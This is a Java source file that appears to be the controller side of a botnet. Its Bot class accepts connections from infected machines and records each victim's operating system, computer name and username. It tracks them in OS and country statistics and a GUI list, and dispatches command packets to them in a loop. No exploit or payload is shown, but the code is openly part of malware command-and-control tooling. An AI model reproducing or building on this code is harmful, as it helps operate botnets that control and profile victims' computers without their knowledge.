package com.redpois0n.bot;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;

import com.redpois0n.common.Version;
import com.redpois0n.packets.Packet;
import com.redpois0n.packets.Packets;
import com.redpois0n.ui.stats.CountryStats;
import com.redpois0n.ui.stats.OsStats;



public final class Bot implements Runnable {

	private final Socket socket;
	private final DataInputStream dis;
	private final DataOutputStream dos;
	private final String ip;
	private String os;
	private String comp;
	private String user;
	private String version;

	public long connect;
	
	public Bot(Socket socket) throws Exception {
		Main.addSocket(this);
		this.socket = socket;
		this.socket.setSoTimeout(10000);
		this.dis = new DataInputStream(socket.getInputStream());
		this.dos = new DataOutputStream(socket.getOutputStream());
		this.ip = socket.getInetAddress().getHostAddress() + ":" + socket.getPort();

		new Thread(this, "Bot " + ip).start();
	}

	public void run() {
		try {
			connect = System.currentTimeMillis();
			os = readLine().replace(" ", "_");
			comp = readLine().replace(" ", "_");
			user = readLine().replace(" ", "_");
			version = readLine();

			Main.log("* Bot (" + toString() + ") connected");
			
			if (Main.isStats) {
				OsStats.add(this);
				CountryStats.add(this);
			}
			
			if (Main.isGui) {
				Main.gui.addBot(this);
			}

			while (true) {
				byte b = dis.readByte();

				Packet p = Packets.getPacket(b);

				if (p != null) {
					p.execute(this);
				}
				
			}
			
		} catch (Exception ex) {
			Main.handleException(ex);
			Main.log("* Bot (" + toString() + ") disconnected: " + ex.getMessage() + " (" + (System.currentTimeMillis() - connect) + ")");
			Main.removeSocket(this);
			if (Main.isGui) {
				Main.gui.removeBot(this);
			}
		}
	}

	public synchronized void writeString(String s) throws Exception {
		dos.writeShort(s.length());
		dos.writeChars(s);
	}

	public synchronized String readLine() throws Exception {
		short len = dis.readShort();

		StringBuilder builder = new StringBuilder();

		for (short s = 0; s < len; s++) {
			builder.append(dis.readChar());
		}

		return builder.toString();
	}

	public synchronized void writeByte(byte b) throws Exception {
		dos.writeByte(b);
	}
	
	public synchronized void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}
	
	@Override
	public String toString() {
		return ip + "-" + os + "-" + user + "@" + comp + "-V" + version;
	}
	
	public void disconnect() throws Exception {
		socket.close();
	}		

	public void writeHandledByte(byte b) {
		try {
			writeByte(b);
		} catch (Exception ex) {
			Main.handleException(ex);
		}
	}
	
	public boolean isUpToDate() {
		return this.version.equals(Version.getVersion());
	}

	public String getIP() {
		return socket.getInetAddress().getHostAddress();
	}
	
	public static final Bot getFromString(String str) {
		for (int i = 0; i < Main.bots.size(); i++) {
			Bot bot = Main.bots.get(i);
			if (bot.toString().equals(str)) {
				return bot;
			}
		}
		
		return null;
	}

	/**
	 * Returns this bots computer name 
	 * @return The computer name (same as username if not windows)
	 */
	public String getComputername() {
		return comp;
	}

	/**
	 * Returns this bots username
	 * @return
	 */
	public String getUsername() {
		return user;
	}

	/**
	 * Returns the version
	 * @return
	 */
	public String getVersion() {
		return version;
	}
	
	/**
	 * Returns the operating system
	 * @return
	 */
	public String getOs() {
		return os;
	}
}
